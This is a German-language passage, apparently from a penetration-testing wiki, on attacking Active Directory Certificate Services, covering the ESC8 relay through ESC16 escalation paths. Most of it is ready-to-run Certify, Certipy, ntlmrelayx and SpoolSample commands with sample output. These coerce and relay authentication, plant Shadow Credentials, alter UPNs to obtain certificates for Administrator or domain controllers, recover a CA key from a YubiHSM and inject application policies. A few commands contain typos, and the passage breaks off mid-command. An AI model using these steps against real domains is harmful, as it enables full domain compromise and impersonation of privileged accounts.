Ein häufiges **Problem** bei NTLM Relay-Angriffen ist die **kurze Dauer von NTLM-Sessions** sowie die Unfähigkeit des Angreifers, mit Services zu interagieren, die **NTLM Signing erfordern**.

Diese Einschränkung lässt sich jedoch überwinden, indem ein NTLM Relay-Angriff genutzt wird, um ein Zertifikat für den Benutzer zu erhalten, da die Gültigkeitsdauer des Zertifikats die Dauer der Session bestimmt und das Zertifikat mit Services verwendet werden kann, die **NTLM Signing erzwingen**. Anweisungen zur Verwendung eines gestohlenen Zertifikats findest du unter:


{{#ref}}
account-persistence.md
{{#endref}}

Eine weitere Einschränkung von NTLM Relay-Angriffen besteht darin, dass **ein vom Angreifer kontrollierter Computer von einem Opferkonto authentifiziert werden muss**. Der Angreifer könnte entweder abwarten oder versuchen, diese Authentifizierung zu **erzwingen**:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuse**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` listet **aktivierte HTTP-AD-CS-Endpunkte** auf:<sup>[[4]](#references)</sup>
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Die Eigenschaft `msPKI-Enrollment-Servers` wird von Enterprise Certificate Authorities (CAs) verwendet, um Endpunkte des Certificate Enrollment Service (CES) zu speichern. Diese Endpunkte können mithilfe des Tools **Certutil.exe** geparst und aufgelistet werden:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Missbrauch mit Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Missbrauch mit [Certipy](https://github.com/ly4k/Certipy)

Die Anforderung eines Zertifikats erfolgt durch Certipy standardmäßig auf Grundlage des Templates `Machine` oder `User`, je nachdem, ob der Name des weitergeleiteten Kontos mit `$` endet. Die Verwendung eines alternativen Templates ist mit dem Parameter `-template` möglich.

Anschließend kann eine Technik wie [PetitPotam](https://github.com/ly4k/PetitPotam) eingesetzt werden, um eine Authentifizierung zu erzwingen. Bei Domain Controllern muss `-template DomainController` angegeben werden.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Keine Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Erklärung

Der neue Wert **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) für **`msPKI-Enrollment-Flag`**, bezeichnet als ESC9, verhindert das Einbetten der **neuen `szOID_NTDS_CA_SECURITY_EXT` Security Extension** in ein Zertifikat. Dieses Flag wird relevant, wenn `StrongCertificateBindingEnforcement` auf `1` (die Standardeinstellung) gesetzt ist, im Gegensatz zu einer Einstellung von `2`. Seine Relevanz steigt in Szenarien, in denen ein schwächeres Certificate Mapping für Kerberos oder Schannel ausgenutzt werden könnte (wie bei ESC10), da das Fehlen von ESC9 die Anforderungen nicht verändern würde.<sup>[[7]](#references)</sup>

Die Bedingungen, unter denen die Einstellung dieses Flags relevant wird, umfassen:

- `StrongCertificateBindingEnforcement` ist nicht auf `2` gesetzt (Standardwert ist `1`), oder `CertificateMappingMethods` enthält das `UPN`-Flag.
- Das Zertifikat ist innerhalb der `msPKI-Enrollment-Flag`-Einstellung mit dem Flag `CT_FLAG_NO_SECURITY_EXTENSION` versehen.
- Im Zertifikat ist ein beliebiges Client-Authentication-EKU angegeben.
- Für irgendein Konto bestehen `GenericWrite`-Berechtigungen, um ein anderes Konto zu kompromittieren.

### Missbrauchsszenario

Angenommen, `John@corp.local` besitzt `GenericWrite`-Berechtigungen über `Jane@corp.local` und hat das Ziel, `Administrator@corp.local` zu kompromittieren. Das Zertifikattemplate `ESC9`, für das `Jane@corp.local` zur Enrollment berechtigt ist, ist in seiner `msPKI-Enrollment-Flag`-Einstellung mit dem Flag `CT_FLAG_NO_SECURITY_EXTENSION` konfiguriert.

Zunächst wird der Hash von `Jane` mithilfe von Shadow Credentials erlangt, ermöglicht durch `John`s `GenericWrite`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Anschließend wird `Jane`'s `userPrincipalName` in `Administrator` geändert, wobei der Domänenteil `@corp.local` absichtlich weggelassen wird:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Diese Änderung verletzt keine Einschränkungen, da `Administrator@corp.local` weiterhin als `userPrincipalName` von `Administrator` eindeutig bleibt.

Anschließend wird das als anfällig markierte Zertifikat-Template `ESC9` als `Jane` angefordert:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Es wird festgestellt, dass der `userPrincipalName` des Zertifikats `Administrator` widerspiegelt und keine „object SID“ enthält.

Der `userPrincipalName` von `Jane` wird anschließend auf seinen ursprünglichen Wert `Jane@corp.local` zurückgesetzt:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Der Authentifizierungsversuch mit dem ausgestellten Zertifikat liefert nun den NT-Hash von `Administrator@corp.local`. Der Befehl muss aufgrund der fehlenden Domänenspezifikation des Zertifikats `-domain <domain>` enthalten:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Schwache Certificate Mappings - ESC10

### Erklärung

Zwei Registry-Key-Werte auf dem Domänencontroller werden von ESC10 verwendet:

- Der Standardwert für `CertificateMappingMethods` unter `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` ist `0x18` (`0x8 | 0x10`), zuvor war er auf `0x1F` gesetzt.
- Die Standardeinstellung für `StrongCertificateBindingEnforcement` unter `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` ist `1`, zuvor `0`.<sup>[[7]](#references)</sup>

**Fall 1**

Wenn `StrongCertificateBindingEnforcement` auf `0` konfiguriert ist.

**Fall 2**

Wenn `CertificateMappingMethods` das `UPN`-Bit (`0x4`) enthält.

### Missbrauchsfall 1

Wenn `StrongCertificateBindingEnforcement` auf `0` konfiguriert ist, kann ein Konto A mit `GenericWrite`-Berechtigungen kompromittiert werden, um jedes Konto B zu kompromittieren.

Wenn ein Angreifer beispielsweise `GenericWrite`-Berechtigungen für `Jane@corp.local` besitzt, versucht er, `Administrator@corp.local` zu kompromittieren. Das Vorgehen entspricht ESC9, sodass jedes Certificate Template verwendet werden kann.

Zunächst wird der Hash von `Jane` mithilfe von Shadow Credentials abgerufen, wobei `GenericWrite` ausgenutzt wird.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Anschließend wird `Jane`'s `userPrincipalName` in `Administrator` geändert, wobei der Teil `@corp.local` absichtlich weggelassen wird, um eine Constraint-Verletzung zu vermeiden.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Anschließend wird als `Jane` ein Zertifikat angefordert, das die Client-Authentifizierung ermöglicht, wobei die standardmäßige `User`-Vorlage verwendet wird.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Der `userPrincipalName` von `Jane` wird anschließend auf seinen ursprünglichen Wert `Jane@corp.local` zurückgesetzt.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Die Authentifizierung mit dem erhaltenen Zertifikat liefert den NT-Hash von `Administrator@corp.local`. Aufgrund der fehlenden Domänendetails im Zertifikat muss die Domäne im Befehl angegeben werden.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Missbrauchsfall 2

Wenn `CertificateMappingMethods` das `UPN`-Bit-Flag (`0x4`) enthält, kann ein Konto A mit `GenericWrite`-Berechtigungen jedes Konto B kompromittieren, dem eine `userPrincipalName`-Eigenschaft fehlt, einschließlich Computerkonten und des integrierten Domänenadministrators `Administrator`.

Hier besteht das Ziel darin, `DC$@corp.local` zu kompromittieren, beginnend mit dem Abrufen des Hashes von `Jane` durch Shadow Credentials unter Ausnutzung von `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`userPrincipalName` von `Jane` wird dann auf `DC$@corp.local` gesetzt.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Ein Zertifikat zur Client-Authentifizierung wird als `Jane` unter Verwendung der standardmäßigen `User`-Vorlage angefordert.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Der `userPrincipalName` von `Jane` wird nach diesem Prozess auf seinen ursprünglichen Wert zurückgesetzt.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Zur Authentifizierung über Schannel wird Certipys Option `-ldap-shell` verwendet, was eine erfolgreiche Authentifizierung als `u:CORP\DC$` anzeigt.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Über die LDAP-Shell ermöglichen Befehle wie `set_rbcd` Angriffe mittels Resource-Based Constrained Delegation (RBCD), wodurch der Domain Controller möglicherweise kompromittiert werden kann.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Diese Schwachstelle betrifft auch jedes Benutzerkonto, bei dem `userPrincipalName` fehlt oder nicht mit `sAMAccountName` übereinstimmt. Das standardmäßige Konto `Administrator@corp.local` ist aufgrund seiner erweiterten LDAP-Berechtigungen und des standardmäßig fehlenden `userPrincipalName` ein besonders relevantes Ziel.

## Relaying NTLM to ICPR - ESC11

### Erklärung

Wenn der CA Server nicht mit `IF_ENFORCEENCRYPTICERTREQUEST` konfiguriert ist, können NTLM relay attacks ohne Signierung über den RPC service durchgeführt werden. [Referenz hier](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Mit `certipy` können Sie überprüfen, ob `Enforce Encryption for Requests` deaktiviert ist. In diesem Fall zeigt certipy die `ESC11` Vulnerabilities an.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Missbrauchsszenario

Es muss ein Relay-Server eingerichtet werden:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Hinweis: Für Domain Controller müssen wir `-template` in DomainController angeben.

Oder unter Verwendung von [sploutchys Fork von impacket](https://github.com/sploutchy/impacket):
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Erklärung

Administratoren können die Certificate Authority so einrichten, dass sie auf einem externen Gerät wie dem „Yubico YubiHSM2“ gespeichert wird.

Wenn das USB-Gerät über einen USB-Anschluss mit dem CA-Server verbunden ist oder über einen USB-Device-Server, falls es sich beim CA-Server um eine virtuelle Maschine handelt, ist ein Authentifizierungsschlüssel (manchmal auch als „Passwort“ bezeichnet) erforderlich, damit der Key Storage Provider Schlüssel im YubiHSM generieren und verwenden kann.

Dieser Schlüssel bzw. dieses Passwort wird in der Registry unter `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` im Klartext gespeichert.

Referenz [hier](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Missbrauchsszenario

Wenn der private Schlüssel der CA auf einem physischen USB-Gerät gespeichert ist und man Shell access erhalten hat, ist es möglich, den Schlüssel wiederherzustellen.

Zuerst muss man das CA-Zertifikat beschaffen (dieses ist öffentlich), anschließend:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Verwenden Sie schließlich den certutil-Befehl `-sign`, um mithilfe des CA-Zertifikats und dessen privatem Schlüssel ein neues beliebiges Zertifikat zu fälschen.

## OID Group Link Abuse - ESC13

### Erklärung

Das Attribut `msPKI-Certificate-Policy` ermöglicht es, die Ausstellungsvorgabe zur Zertifikatvorlage hinzuzufügen. Die für die Ausstellung von Vorgaben zuständigen `msPKI-Enterprise-Oid`-Objekte können im Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) des PKI-OID-Containers gefunden werden. Eine Vorgabe kann über das Attribut `msDS-OIDToGroupLink` dieses Objekts mit einer AD-Gruppe verknüpft werden. Dadurch kann ein System einen Benutzer, der das Zertifikat vorlegt, so autorisieren, als wäre er Mitglied dieser Gruppe. [Referenz hier](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Mit anderen Worten: Wenn ein Benutzer die Berechtigung besitzt, ein Zertifikat anzufordern, und das Zertifikat mit einer OID-Gruppe verknüpft ist, kann der Benutzer die Berechtigungen dieser Gruppe erben.

Verwenden Sie [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1), um OIDToGroupLink zu finden:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Missbrauchsszenario

Finde eine Benutzerberechtigung. Dafür kannst du `certipy find` oder `Certify.exe find /showAllPermissions` verwenden.

Wenn `John` die Berechtigung hat, sich für `VulnerableTemplate` zu enrollen, kann der Benutzer die Privilegien der Gruppe `VulnerableGroup` erben.

Dazu muss er lediglich das Template angeben. Er erhält dann ein Zertifikat mit OIDToGroupLink-Rechten.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Vulnerable Certificate Renewal Configuration- ESC14

### Erklärung

Die Beschreibung unter https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping ist bemerkenswert ausführlich. Nachfolgend finden Sie ein Zitat des Originaltexts.<sup>[[14]](#references)</sup>

ESC14 befasst sich mit Schwachstellen, die durch „weak explicit certificate mapping“ entstehen, insbesondere durch den Missbrauch oder die unsichere Konfiguration des Attributs `altSecurityIdentities` bei Active Directory-Benutzer- oder Computerkonten. Dieses mehrwertige Attribut ermöglicht es Administratoren, X.509-Zertifikate manuell zu einem AD-Konto zwecks Authentifizierung zuzuordnen. Wenn diese expliziten Zuordnungen vorhanden sind, können sie die standardmäßige Logik für die Zertifikatzuordnung überschreiben, die sich normalerweise auf UPNs oder DNS-Namen im SAN des Zertifikats oder auf die in der Sicherheits-Erweiterung `szOID_NTDS_CA_SECURITY_EXT` eingebettete SID stützt.

Eine Zuordnung ist „weak“, wenn der im Attribut `altSecurityIdentities` verwendete Zeichenfolgenwert zur Identifizierung eines Zertifikats zu allgemein und leicht zu erraten ist, auf nicht eindeutigen Zertifikatsfeldern basiert oder leicht fälschbare Zertifikatskomponenten verwendet. Wenn ein Angreifer ein Zertifikat erhalten oder erstellen kann, dessen Attribute mit einer solchen weak definierten expliziten Zuordnung für ein privilegiertes Konto übereinstimmen, kann er dieses Zertifikat verwenden, um sich als dieses Konto zu authentifizieren und es zu impersonate.

Beispiele für potenziell schwache Zuordnungszeichenfolgen in `altSecurityIdentities` sind:

- Ausschließliche Zuordnung anhand eines allgemeinen Subject Common Name (CN): z. B. `X509:<S>CN=SomeUser`. Ein Angreifer könnte möglicherweise ein Zertifikat mit diesem CN aus einer weniger sicheren Quelle erhalten.
- Verwendung übermäßig allgemeiner Issuer Distinguished Names (DNs) oder Subject DNs ohne zusätzliche Einschränkung, etwa durch eine bestimmte Seriennummer oder einen Subject Key Identifier: z. B. `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Verwendung anderer vorhersehbarer Muster oder nicht kryptografischer Identifikatoren, die ein Angreifer möglicherweise in einem Zertifikat erfüllen kann, das er rechtmäßig erhalten oder fälschen kann (wenn er eine CA kompromittiert oder ein verwundbares Template wie bei ESC1 gefunden hat).

Das Attribut `altSecurityIdentities` unterstützt verschiedene Formate für die Zuordnung, darunter:

- `X509:<I>IssuerDN<S>SubjectDN` (Zuordnung anhand des vollständigen Issuer- und Subject-DN)
- `X509:<SKI>SubjectKeyIdentifier` (Zuordnung anhand des Werts der Subject-Key-Identifier-Erweiterung des Zertifikats)
- `X509:<SR>SerialNumberBackedByIssuerDN` (Zuordnung anhand der Seriennummer, implizit durch den Issuer-DN eingeschränkt) – dies ist kein Standardformat, normalerweise lautet es `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (Zuordnung anhand eines RFC822-Namens, typischerweise einer E-Mail-Adresse, aus dem SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (Zuordnung anhand eines SHA1-Hashes des rohen öffentlichen Schlüssels des Zertifikats – im Allgemeinen strong)

Die Sicherheit dieser Zuordnungen hängt stark von der Spezifität, Eindeutigkeit und kryptografischen Stärke der ausgewählten Zertifikatsidentifikatoren ab, die in der Zuordnungszeichenfolge verwendet werden. Selbst wenn auf Domain Controllern strong certificate binding modes aktiviert sind (die sich hauptsächlich auf implizite Zuordnungen anhand von SAN-UPNs/DNS und der SID-Erweiterung auswirken), kann ein schlecht konfigurierter `altSecurityIdentities`-Eintrag weiterhin einen direkten Weg zur Impersonation darstellen, wenn die Zuordnungslogik selbst fehlerhaft oder zu permissive ist.
### Missbrauchsszenario

ESC14 zielt auf **explizite Zertifikatzuordnungen** in Active Directory (AD) ab, insbesondere auf das Attribut `altSecurityIdentities`. Wenn dieses Attribut gesetzt ist (absichtlich oder aufgrund einer Fehlkonfiguration), können Angreifer Konten impersonate, indem sie Zertifikate vorlegen, die der Zuordnung entsprechen.

#### Szenario A: Angreifer kann in `altSecurityIdentities` schreiben

**Voraussetzung**: Der Angreifer verfügt über Schreibberechtigungen für das Attribut `altSecurityIdentities` des Zielkontos oder über die Berechtigung, diese in Form einer der folgenden Berechtigungen für das Ziel-AD-Objekt zu gewähren:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.
#### Szenario B: Ziel verfügt über eine schwache Zuordnung über X509RFC822 (E-Mail)

- **Voraussetzung**: Das Ziel verfügt über eine schwache X509RFC822-Zuordnung in altSecurityIdentities. Ein Angreifer kann das mail-Attribut des Opfers so setzen, dass es mit dem X509RFC822-Namen des Ziels übereinstimmt, ein Zertifikat als das Opfer enrollen und dieses verwenden, um sich als das Ziel zu authentifizieren.
#### Szenario C: Ziel verfügt über eine X509IssuerSubject-Zuordnung

- **Voraussetzung**: Das Ziel verfügt über eine schwache explizite X509IssuerSubject-Zuordnung in `altSecurityIdentities`.Der Angreifer kann das Attribut `cn` oder `dNSHostName` eines Opfer-Principals so setzen, dass es mit dem Subject der X509IssuerSubject-Zuordnung des Ziels übereinstimmt. Anschließend kann der Angreifer ein Zertifikat als das Opfer enrollen und dieses Zertifikat verwenden, um sich als das Ziel zu authentifizieren.
#### Szenario D: Ziel verfügt über eine X509SubjectOnly-Zuordnung

- **Voraussetzung**: Das Ziel verfügt über eine schwache explizite X509SubjectOnly-Zuordnung in `altSecurityIdentities`. Der Angreifer kann das Attribut `cn` oder `dNSHostName` eines Opfer-Principals so setzen, dass es mit dem Subject der X509SubjectOnly-Zuordnung des Ziels übereinstimmt. Anschließend kann der Angreifer ein Zertifikat als das Opfer enrollen und dieses Zertifikat verwenden, um sich als das Ziel zu authentifizieren.
### Konkrete Vorgänge
#### Szenario A

Fordern Sie ein Zertifikat des Zertifikat-Templates `Machine` angefordert
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Zertifikat speichern und konvertieren
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Authentifizieren (mithilfe des Zertifikats)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Bereinigung (optional)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
For spezifischere Angriffsmethoden in verschiedenen Angriffsszenarien siehe bitte: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Erklärung

Die Beschreibung unter https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc ist bemerkenswert ausführlich. Nachfolgend ist der Originaltext zitiert.<sup>[[15]](#references)</sup>

Mithilfe integrierter standardmäßiger Zertifikatvorlagen der Version 1 kann ein Angreifer eine CSR erstellen, die Application Policies enthält, welche gegenüber den in der Vorlage konfigurierten Extended Key Usage-Attributen bevorzugt werden. Die einzige Voraussetzung sind Berechtigungen zur Zertifikatsregistrierung. Damit können Client-Authentifizierungs-, Certificate Request Agent- und Codesigning-Zertifikate mithilfe der **_WebServer_**-Vorlage erstellt werden.

### Missbrauch

Das Folgende verweist auf [diesen Link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Klicken Sie hier, um detailliertere Verwendungsmethoden zu sehen.<sup>[[14]](#references)</sup>


Der Befehl `find` von Certipy kann dabei helfen, V1-Vorlagen zu identifizieren, die möglicherweise für ESC15 anfällig sind, wenn die CA nicht gepatcht wurde.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenario A: Direct Impersonation via Schannel

**Schritt 1: Ein Zertifikat anfordern und dabei die Application Policy „Client Authentication“ sowie die Ziel-UPN einschleusen.** Der Angreifer `attacker@corp.local` zielt mit dem V1-Template „WebServer“ (das ein vom Enrollee geliefertes Subject erlaubt) auf `administrator@corp.local`.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Das verwundbare V1-Template mit „Enrollee supplies subject“.
- `-application-policies 'Client Authentication'`: Fügt die OID `1.3.6.1.5.5.7.3.2` in die Application-Policies-Erweiterung der CSR ein.
- `-upn 'administrator@corp.local'`: Setzt den UPN im SAN zur Impersonation.

**Schritt 2: Über Schannel (LDAPS) mit dem erhaltenen Zertifikat authentifizieren.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Szenario B: PKINIT/Kerberos-Impersonation über den Missbrauch eines Enrollment Agent

**Schritt 1: Ein Zertifikat von einem V1-Template anfordern (mit „Enrollee supplies subject“) und dabei die Application Policy „Certificate Request Agent“ einschleusen.** Dieses Zertifikat ist für den Angreifer (`attacker@corp.local`), damit er zum Enrollment Agent wird. Für die eigene Identität des Angreifers wird hier keine UPN angegeben, da das Ziel die Agent-Funktionalität ist.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Fügt die OID `1.3.6.1.4.1.311.20.2.1` ein.

**Schritt 2: Verwende das „agent“-Zertifikat, um im Namen eines privilegierten Zielbenutzers ein Zertifikat anzufordern.** Dies ist ein ESC3-ähnlicher Schritt, bei dem das Zertifikat aus Schritt 1 als Agent-Zertifikat verwendet wird.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Schritt 3: Authentifizieren Sie sich als der privilegierte Benutzer mithilfe des „on-behalf-of“-Zertifikats.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Security Extension auf der CA (global) deaktiviert – ESC16

### Erklärung

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** bezeichnet das Szenario, in dem ein Angreifer Folgendes ausnutzen kann, wenn die Konfiguration von AD CS die Aufnahme der Erweiterung **szOID_NTDS_CA_SECURITY_EXT** in alle Zertifikate nicht erzwingt:

1. Ein Zertifikat **ohne SID binding** anfordern.

2. Dieses Zertifikat **zur Authentifizierung als beliebiges Konto** verwenden, beispielsweise zur Imitation eines Kontos mit hohen Berechtigungen (z. B. eines Domain Administrators).

Weitere Informationen zum detaillierten Prinzip finden Sie in diesem Artikel:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Missbrauch

Das Folgende bezieht sich auf [diesen Link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally). Klicken Sie hier, um detailliertere Nutzungsmethoden anzuzeigen.<sup>[[14]](#references)</sup>

Um festzustellen, ob die Active Directory Certificate Services (AD CS)-Umgebung für **ESC16** anfällig ist,
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Schritt 1: Ursprüngliche UPN des Opferkontos auslesen (optional – zur Wiederherstellung).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Schritt 2: Aktualisiere den UPN des Opferkontos auf den `sAMAccountName` des Zieladministrators.
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Schritt 3: (Falls erforderlich) Beschaffe Zugangsdaten für das „victim“-Konto (z. B. über Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Schritt 4: Fordern Sie als der Benutzer „victim“ ein Zertifikat von _jedem geeigneten Client-Authentifizierungstemplate_ (z. B. „User“) auf der für ESC16 anfälligen CA an.** Da die CA für ESC16 anfällig ist, lässt sie die SID-Sicherheitserweiterung automatisch aus dem ausgestellten Zertifikat weg, unabhängig von den spezifischen Einstellungen des Templates für diese Erweiterung. Setzen Sie die Umgebungsvariable für den Kerberos-Credential-Cache (Shell-Befehl):
```bash
export KRB5CCNAME=victim.ccache
```
Fordern Sie dann das Zertifikat an:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
